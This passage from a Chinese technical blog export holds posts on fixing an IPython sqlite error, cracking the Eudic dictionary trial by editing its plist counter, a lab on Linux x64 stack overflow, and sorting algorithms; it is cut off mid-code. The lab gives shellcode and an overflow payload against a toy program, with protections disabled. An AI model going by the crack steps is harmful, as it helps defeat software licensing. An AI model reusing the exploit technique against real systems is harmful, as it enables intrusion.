乍一看是ipython的问题，第一感觉是ipython和pycharm不兼容，以为是ipython版本太高了导致不兼容，以前有出现过这样的问题。试了其他ipython版本，发现还是报错，那就不是ipython版本问题。</p>\n<a id=\"more\"></a>\n<p>于是命令行打开ipython, 提示警告如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/local/lib/python2.7/site-packages/IPython/core/history.py:228: UserWarning: IPython History requires SQLite, your history will not be saved</span><br><span class=\"line\">  warn(&quot;IPython History requires SQLite, your history will not be saved&quot;)</span><br></pre></td></tr></table></figure>\n<p>也就是ipython不能使用sqlite来存储历史记录，应该是sqlite和 python的锅了，在linux上要先装sqlite3,再装python,以便python能使用sqlite接口。尝试<code>import sqlite3</code>，看看是否是这个问题，出现报错如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ImportError: dlopen(/usr/local/Cellar/python/2.7.14/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_sqlite3.so, 2): Symbol not found: _sqlite3_enable_load_extension</span><br><span class=\"line\">  Referenced from: /usr/local/Cellar/python/2.7.14/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_sqlite3.so</span><br><span class=\"line\">  Expected in: /usr/lib/libsqlite3.dylib</span><br><span class=\"line\"> in /usr/local/Cellar/python/2.7.14/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_sqlite3.so</span><br></pre></td></tr></table></figure>\n<p>果然是导入错误，问题明确了，google一番：<a href=\"https://stackoverflow.com/questions/41994449/symbol-not-found-sqlite3-enable-load-extension-sqlite-installed-via-homebrew\" target=\"_blank\" rel=\"noopener\">https://stackoverflow.com/questions/41994449/symbol-not-found-sqlite3-enable-load-extension-sqlite-installed-via-homebrew</a></p>\n<p>解决方案如下：</p>\n<ul>\n<li><p><code>brew install sqlite</code> or <code>brew reinstall sqlite</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">his formula is keg-only, which means it was not symlinked into /usr/local,</span><br><span class=\"line\">because macOS provides an older sqlite3.</span><br><span class=\"line\"></span><br><span class=\"line\">If you need to have this software first in your PATH run:</span><br><span class=\"line\">  echo &apos;export PATH=&quot;/usr/local/opt/sqlite/bin:$PATH&quot;&apos; &gt;&gt; ~/.zshrc</span><br><span class=\"line\"></span><br><span class=\"line\">For compilers to find this software you may need to set:</span><br><span class=\"line\">    LDFLAGS:  -L/usr/local/opt/sqlite/lib</span><br><span class=\"line\">    CPPFLAGS: -I/usr/local/opt/sqlite/include</span><br><span class=\"line\">For pkg-config to find this software you may need to set:</span><br><span class=\"line\">    PKG_CONFIG_PATH: /usr/local/opt/sqlite/lib/pkgconfig</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>vim .zshrc, 添加如下内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#sqlite</span><br><span class=\"line\">export PATH=&quot;/usr/local/opt/sqlite/bin:$PATH&quot;</span><br><span class=\"line\">LDFLAGS=&quot;-L/usr/local/opt/sqlite/lib&quot;</span><br><span class=\"line\">CPPFLAGS=&quot;-I/usr/local/opt/sqlite/include&quot;</span><br><span class=\"line\">export PKG_CONFIG_PATH=&quot;/usr/local/opt/sqlite/lib/pkgconfig&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>source .zshrc</p>\n</li>\n</ul>\n<p>问题解决，ipython, pycharm均没问题。</p>\n","categories":["solution"],"tags":["MAC"]},{"title":"破解MAC版欧陆词典3.6.8","url":"http://www.beesfun.com/2017/11/06/【破解】MAC版欧陆词典3-6-8/","content":"<p>欧陆词典3.6.8版本破解，只需改<code>com.eusoft.eudic.plist</code>文件(/users/用户名/Library/Preferences/com.eusoft.eudic.plist)中的<code>MAIN_TimesLeft</code>为820711即可。</p>\n<img src=\"/2017/11/06/【破解】MAC版欧陆词典3-6-8/7.png\">\n<a id=\"more\"></a>\n<ul>\n<li><p>官网下载最新版欧陆词典并安装</p>\n</li>\n<li><p>打开欧陆词典后，退出欧陆词典</p>\n</li>\n<li><p>使用xcode打开<code>com.eusoft.eudic.plist</code>文件，修改剩余次数</p>\n<img src=\"/2017/11/06/【破解】MAC版欧陆词典3-6-8/3.png\">\n<img src=\"/2017/11/06/【破解】MAC版欧陆词典3-6-8/4.png\">\n</li>\n<li><p>修改属性值后关闭文件，修改当前用户属性并设置锁住</p>\n<img src=\"/2017/11/06/【破解】MAC版欧陆词典3-6-8/5.png\">\n</li>\n<li><p>重启电脑，在打开欧陆词典</p>\n<img src=\"/2017/11/06/【破解】MAC版欧陆词典3-6-8/6.png\">\n<img src=\"/2017/11/06/【破解】MAC版欧陆词典3-6-8/7.png\"></li>\n</ul>\n","categories":["破解"],"tags":["MAC","破解"]},{"title":"【实验】linux x64栈溢出","url":"http://www.beesfun.com/2017/10/11/【实验】linux-x64栈溢出/","content":"<p>这篇文章主要记录基于64位linux的栈溢出实验，在实验过程中遇到的问题，以及自己的一些思考。</p>\n<h2 id=\"环境配置\"><a href=\"#环境配置\" class=\"headerlink\" title=\"环境配置\"></a>环境配置</h2><p>实验基于Ubuntu 16.04, 操作系统版本以及gcc, gdb版本信息如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x8664 x8664 x86_64 GNU/Linux</span><br><span class=\"line\"></span><br><span class=\"line\">gcc (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609</span><br><span class=\"line\"></span><br><span class=\"line\">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<p>为了更简单的方式实现栈溢出，需要关闭一些保护措施。</p>\n<ul>\n<li><p>ASLR(地址空间布局随机化)</p>\n<p>关闭ASLR：<code>sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code></p>\n</li>\n<li><p>Cannary</p>\n<p>开启Canary之后，函数开始时在ebp和临时变量之间插入一个随机值，函数结束时验证这个值。如果不相等（也就是这个值被其他值覆盖了），就会调用 _stackchk_fail函数，终止进程。对应GCC编译选项<code>-fno-stack-protector</code>解除该保护。</p>\n</li>\n<li><p>NX.<br>开启NX保护之后，程序的堆栈将会不可执行。对应GCC编译选项<code>-z execstack</code>解除该保护。</p>\n</li>\n</ul>\n<h3 id=\"GCC-与gdb版本问题\"><a href=\"#GCC-与gdb版本问题\" class=\"headerlink\" title=\"GCC 与gdb版本问题\"></a>GCC 与gdb版本问题</h3><p>gcc从4.8开始缺省使用了-gdwarf-4选项，较旧的gdb无法识别dwarf4版本的调试信息, 参见<a href=\"https://gcc.gnu.org/gcc-4.8/changes.html\" target=\"_blank\" rel=\"noopener\">https://gcc.gnu.org/gcc-4.8/changes.html</a>。用gcc编译程序时，使用选项-gdwarf-3来指定生成dwarf3版本的调试信息，这样旧版的gdb就可以识别调试信息了。</p>\n<p>综合上述信息，使用gcc编译，应当使用如下命令:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -fno-stack-protector -z execstack -gdwarf-3 xxx.c -o xxx</span><br></pre></td></tr></table></figure>\n<h2 id=\"编写shellcode\"><a href=\"#编写shellcode\" class=\"headerlink\" title=\"编写shellcode\"></a>编写shellcode</h2><p>对栈溢出的利用，通常是覆盖返回地址，指向自shellcode的地址，从而执行shellcode。因此，这里先解决shellcode的编写问题。参考：<a href=\"https://www.exploit-db.com/exploits/36858/\" target=\"_blank\" rel=\"noopener\">https://www.exploit-db.com/exploits/36858/</a>。首先编写汇编文件，验证shellcode功能，然后再提取机器码。使用<code>AT&amp;T</code>风格编写汇编文件如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.global _start</span><br><span class=\"line\">_start:</span><br><span class=\"line\">    xor %esi, %esi</span><br><span class=\"line\">    # /bin//sh</span><br><span class=\"line\">    movabs $0x68732f2f6e69622f, %rbx</span><br><span class=\"line\">    push %rsi</span><br><span class=\"line\">    push %rbx</span><br><span class=\"line\">    push %rsp</span><br><span class=\"line\">    pop %rdi</span><br><span class=\"line\">    pushq $59</span><br><span class=\"line\">    pop %rax</span><br><span class=\"line\">    xor %edx, %edx</span><br><span class=\"line\">    syscall</span><br></pre></td></tr></table></figure>\n<img src=\"/2017/10/11/【实验】linux-x64栈溢出/001.png\">\n<p>提取机器码:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> $(objdump -d tmp | grep <span class=\"string\">\"^ \"</span> | cut -f2); <span class=\"keyword\">do</span> <span class=\"built_in\">echo</span> -n <span class=\"string\">'\\x'</span><span class=\"variable\">$i</span>; <span class=\"keyword\">done</span>; <span class=\"built_in\">echo</span></span><br><span class=\"line\">\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05</span><br></pre></td></tr></table></figure>\n<h2 id=\"编写栈溢出程序\"><a href=\"#编写栈溢出程序\" class=\"headerlink\" title=\"编写栈溢出程序\"></a>编写栈溢出程序</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">overflow</span><span class=\"params\">(<span class=\"keyword\">char</span>* str)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buf[<span class=\"number\">128</span>];</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buf, str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> str[<span class=\"number\">256</span>]=<span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05 AAAAAAAA\"</span>;</span><br><span class=\"line\">    overflow(str);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面这段程序栈溢出漏洞触发点在strcpy函数, 函数没有做边界检查，可导致栈溢出覆盖返回地址。成功利用栈溢出需要确定覆盖多少个字节可以覆盖到返回地址，另外就是确定shellcode的地址即str的首地址，让返回地址指向该地址。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$gcc</span> -fno-stack-protector -z execstack -gdwarf-3 pwn.c -o pwn</span><br><span class=\"line\"><span class=\"variable\">$gdb</span> pwn</span><br><span class=\"line\">(gdb) start</span><br><span class=\"line\">Temporary breakpoint 1, main () at pwn.c:10</span><br><span class=\"line\">10\t    char str[256]=<span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05 AAAAAAAA\"</span>;</span><br><span class=\"line\">(gdb) p /x <span class=\"variable\">$rsp</span></span><br><span class=\"line\"><span class=\"variable\">$4</span> = 0x7fffffffdc10</span><br><span class=\"line\">(gdb) p /x <span class=\"variable\">$rbp</span></span><br><span class=\"line\"><span class=\"variable\">$5</span> = 0x7fffffffdd10        <span class=\"comment\"># rbp rsp相差0x100, 即256,正是str申请的空间大小</span></span><br><span class=\"line\">(gdb) p /x &amp;str</span><br><span class=\"line\"><span class=\"variable\">$3</span> = 0x7fffffffdc10\t\t   <span class=\"comment\"># str首地址</span></span><br><span class=\"line\">(gdb) s</span><br><span class=\"line\">11\t    overflow(str);</span><br><span class=\"line\">(gdb) s</span><br><span class=\"line\">overflow (str=0x7fffffffdc10 <span class=\"string\">\"1\\366H\\273/bin//shVST_j;X1\\322\\017\\005 AAAAAAAA\"</span>)</span><br><span class=\"line\">    at pwn.c:6</span><br><span class=\"line\">6\t    strcpy(buf, str);</span><br><span class=\"line\">(gdb) p /x &amp;buf</span><br><span class=\"line\"><span class=\"variable\">$7</span> = 0x7fffffffdb80</span><br><span class=\"line\">(gdb) p /x <span class=\"variable\">$rbp</span></span><br><span class=\"line\"><span class=\"variable\">$8</span> = 0x7fffffffdc00\t\t\t<span class=\"comment\"># 0x7fffffffdc00 - 0x7fffffffdb80 = 128，即buf申请的空间大小</span></span><br></pre></td></tr></table></figure>\n<p>使用的shellcode长度为23字节，为了覆盖到返回地址，需要128+8(ebp)=136字节，则除了shellcode外还需要136-23=113填充字节。另外返回地址为0x7fffffffdd10,改为小端模式<code>\\x10\\xdc\\xff\\xff\\xff\\x7f</code>。那么payload为</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">char</span> str[<span class=\"number\">256</span>]=<span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x10\\xdc\\xff\\xff\\xff\\x7f\"</span>;</span><br></pre></td></tr></table></figure>\n<p>编译后运行程序，出现段错误，不符合预期，于是gdb调试。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ./pwn</span><br><span class=\"line\">段错误 (核心已转储)</span><br><span class=\"line\"></span><br><span class=\"line\">(gdb) s</span><br><span class=\"line\">overflow (</span><br><span class=\"line\">    str=0x7fffffffdc10 <span class=\"string\">\"1\\366H\\273/bin//shVST_j;X1\\322\\017\\005 \"</span>, <span class=\"string\">'A'</span> &lt;repeats 112 <span class=\"built_in\">times</span>&gt;, <span class=\"string\">\"\\020\\334\\377\\377\\377\\177\"</span>) at pwn.c:6</span><br><span class=\"line\">6\t    strcpy(buf, str);</span><br><span class=\"line\">(gdb) n</span><br><span class=\"line\">7\t&#125;</span><br><span class=\"line\">(gdb) s</span><br><span class=\"line\">Warning:</span><br><span class=\"line\">Cannot insert breakpoint 0.</span><br><span class=\"line\">Cannot access memory at address 0x6e69622fbb48f631</span><br><span class=\"line\"></span><br><span class=\"line\">0x00007fffffffdc10 <span class=\"keyword\">in</span> ?? ()</span><br><span class=\"line\">(gdb) p /x <span class=\"variable\">$rsp</span></span><br><span class=\"line\"><span class=\"variable\">$1</span> = 0x7fffffffdc10</span><br><span class=\"line\">(gdb) p /x <span class=\"variable\">$rbp</span></span><br><span class=\"line\"><span class=\"variable\">$2</span> = 0x4141414141414141</span><br><span class=\"line\">(gdb) p /x <span class=\"variable\">$rip</span></span><br><span class=\"line\"><span class=\"variable\">$3</span> = 0x7fffffffdc10</span><br><span class=\"line\">(gdb) x/32xg <span class=\"variable\">$rsp</span>-0x10</span><br><span class=\"line\">0x7fffffffdc00:\t0x4141414141414141\t0x00007fffffffdc10</span><br><span class=\"line\">0x7fffffffdc10:\t0x6e69622fbb48f631\t0x5f54535668732f2f</span><br><span class=\"line\">0x7fffffffdc20:\t0x20050fd231583b6a\t0x4141414141414141</span><br><span class=\"line\">0x7fffffffdc30:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x7fffffffdc40:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x7fffffffdc50:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x7fffffffdc60:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x7fffffffdc70:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x7fffffffdc80:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x7fffffffdc90:\t0x4141414141414141\t0x00007fffffffdc10</span><br><span class=\"line\">0x7fffffffdca0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7fffffffdcb0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7fffffffdcc0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7fffffffdcd0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7fffffffdce0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7fffffffdcf0:\t0x0000000000000000\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>gdb查看rip, rsp, rbp都是正确的，然而实际运行却是段错误，网上搜索一番，原来是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，既然找到原因了，解决起来就比较容易了，只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。</p>\n<p>一种方案是修改源程序，打印出str的首地址：<code>printf(&quot;%p\\n&quot;, str);</code>;另外一种方案是利用内核转储获取真实内存地址，无须改变源码。</p>\n<h3 id=\"GDB获取真实内存地址\"><a href=\"#GDB获取真实内存地址\" class=\"headerlink\" title=\"GDB获取真实内存地址\"></a>GDB获取真实内存地址</h3><p>首先启用内核转储：<code>ulimit -c unlimited</code>。该方法只在当前shell中生效，永久生效可以修改<code>/etc/profile</code>, 添加：<code>ulimit -c unlimited</code>。缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb &lt;程序可执行文件&gt; &lt;coredump转储文件&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$ulimit</span> -c unlimited</span><br><span class=\"line\">$ ./pwn</span><br><span class=\"line\">段错误 (核心已转储)</span><br><span class=\"line\">$ gdb pwn core</span><br><span class=\"line\"></span><br><span class=\"line\">Type <span class=\"string\">\"apropos word\"</span> to search <span class=\"keyword\">for</span> commands related to <span class=\"string\">\"word\"</span>...</span><br><span class=\"line\">Reading symbols from pwn...done.</span><br><span class=\"line\">[New LWP 11347]</span><br><span class=\"line\">Core was generated by `./pwn<span class=\"string\">'.</span></span><br><span class=\"line\"><span class=\"string\">Program terminated with signal SIGSEGV, Segmentation fault.</span></span><br><span class=\"line\"><span class=\"string\">#0  0x00007fffffffdc10 in ?? ()</span></span><br></pre></td></tr></table></figure>\n<img src=\"/2017/10/11/【实验】linux-x64栈溢出/003.png\">\n<p>从上图可以看出shellcode地址，修改payload为: </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">char</span> str[<span class=\"number\">256</span>]=<span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x40\\xdc\\xff\\xff\\xff\\x7f\"</span>;</span><br></pre></td></tr></table></figure>\n<p>重新编译运行。<br><img src=\"/2017/10/11/【实验】linux-x64栈溢出/004.png\"></p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://www.exploit-db.com/docs/33698.pdf\" target=\"_blank\" rel=\"noopener\">https://www.exploit-db.com/docs/33698.pdf</a></li>\n<li><a href=\"http://www.therabb1thole.co.uk/tutorial/linux-64-bit-buffer-overflow-tutorial/\" target=\"_blank\" rel=\"noopener\">Linux 64-bit Buffer Overflow Tutorial</a></li>\n<li><a href=\"http://www.therabb1thole.co.uk/tutorial/writing-linux-x86_64-bit-shellcode/\" target=\"_blank\" rel=\"noopener\">Where does Shellcode come from</a></li>\n</ul>\n","categories":["二进制安全"],"tags":["linux","栈溢出"]},{"title":"基本排序算法","url":"http://www.beesfun.com/2017/09/30/基本排序算法/","content":"<h2 id=\"冒泡排序\"><a href=\"#冒泡排序\" class=\"headerlink\" title=\"冒泡排序\"></a>冒泡排序</h2><blockquote>\n<p>稳定排序, 时间复杂度: O(N^2)</p>\n</blockquote>\n<p>冒泡排序(Bubble Sort)，又被称为气泡排序或泡沫排序，它会遍历若干次要排序的数列，每次遍历时，它都会从前往后依次的比较相邻两个数的大小；如果前者比后者大，则交换它们的位置。这样，一次遍历之后，最大的元素就在数列的末尾！ 二次遍历时，第二大的元素就被排列在最大元素之前。N次遍历整个数列都有序。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">bubble_sort</span><span class=\"params\">(lists)</span>:</span></span><br><span class=\"line\">  cnt = len(lists)</span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(cnt):</span><br><span class=\"line\">    <span class=\"comment\"># 比较序列递减</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, cnt-i):</span><br><span class=\"line\">      <span class=\"keyword\">if</span> lists[j<span class=\"number\">-1</span>] &gt; lists[j]:</span><br><span class=\"line\">        <span class=\"comment\">#swap</span></span><br><span class=\"line\">        lists[j<span class=\"number\">-1</span>], lists[j] = lists[j], lists[j<span class=\"number\">-1</span>]</span><br><span class=\"line\">  <span class=\"keyword\">return</span> lists</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"选择排序\"><a href=\"#选择排序\" class=\"headerlink\" title=\"选择排序\"></a>选择排序</h2><blockquote>\n<p>稳定排序, 时间复杂度: O(N^2)</p>\n</blockquote>\n<p>选择排序(Selection sort)是一种简单直观的排序算法，基本思想是：首先在未排序的数列中找到最小(or最大)元素，然后将其存放到数列的起始位置；接着，再从剩余未排序的元素中继续寻找最小(or最大)元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">select_sort</span><span class=\"params\">(lists)</span>:</span></span><br><span class=\"line\">  cnt = len(lists)</span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(cnt):</span><br><span class=\"line\">    <span class=\"comment\"># 比较序列递减</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(i+<span class=\"number\">1</span>, cnt):</span><br><span class=\"line\">      <span class=\"keyword\">if</span> lists[i] &gt; lists[j]:</span><br><span class=\"line\">        <span class=\"comment\">#swap</span></span><br><span class=\"line\">        lists[i], lists[j] = lists[j], lists[i]</span><br><span class=\"line\">  <span class=\"keyword\">return</span> lists</span><br></pre></td></tr></table></figure>\n<h2 id=\"直接插入排序\"><a href=\"#直接插入排序\" class=\"headerlink\" title=\"直接插入排序\"></a>直接插入排序</h2><blockquote>\n<p>稳定排序, 时间复杂度: O(N^2)</p>\n</blockquote>\n<p>直接插入排序(Straight Insertion Sort)的基本思想是：把n个待排序的元素看成为一个有序表和一个无序表。开始时有序表中只包含1个元素，无序表中包含有n-1个元素，排序过程中每次从无序表中取出第一个元素，将它插入到有序表中的适当位置，使之成为新的有序表，重复n-1次可完成排序过程</p>\n<ul>\n<li>数据后移</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">insert_sort</span><span class=\"params\">(lists)</span>:</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(lists)):</span><br><span class=\"line\">    j = i<span class=\"number\">-1</span></span><br><span class=\"line\">    tmp = lists[i]</span><br><span class=\"line\">    <span class=\"keyword\">while</span> lists[j]&gt;tmp <span class=\"keyword\">and</span> j&gt;=<span 